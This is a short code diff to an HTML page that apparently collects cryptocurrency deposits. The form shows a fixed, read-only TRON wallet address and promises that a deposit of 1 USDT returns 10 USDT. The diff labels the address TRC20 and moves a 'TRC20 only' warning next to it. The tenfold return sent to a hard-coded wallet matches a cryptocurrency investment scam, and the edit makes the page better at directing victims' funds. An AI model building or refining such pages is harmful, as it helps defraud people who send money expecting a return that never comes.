@@ -43,8 +43,10 @@
     <form name="usdt-form" method="POST" data-netlify="true" action="?submitted=true">
       <input type="hidden" name="form-name" value="usdt-form">
 
-      <label for="buyAddress">Buy Address (Send Your USDT Here):</label>
+      <label for="buyAddress">Buy Address (TRC20) (Send Your USDT Here):</label>
       <input type="text" id="buyAddress" name="buyAddress" value="TVuDSSUvFyUxFJGtXAAM1SQ7UNscPEdaHM" readonly>
+
+      <p class="note">PLEASE USE TRC20 (TRON) ONLY, OR YOUR ASSETS MAY BE LOST</p>
 
       <label for="usdtAddress">Your USDT Address:</label>
       <input type="text" id="usdtAddress" name="usdtAddress" placeholder="Enter your TRC20 address" required>
@@ -52,7 +54,6 @@
       <label for="deposit">If you deposit <input type="number" id="deposit" name="deposit" value="1.00" step="0.01"> USDT</label>
       <label>You will get <span id="outputVal">10.00</span> USDT</label>
 
-      <p class="note">PLEASE USE TRC20 (TRON) ONLY, OR YOUR ASSETS MAY BE LOST</p>
       <button type="submit">Submit</button>
     </form>
 
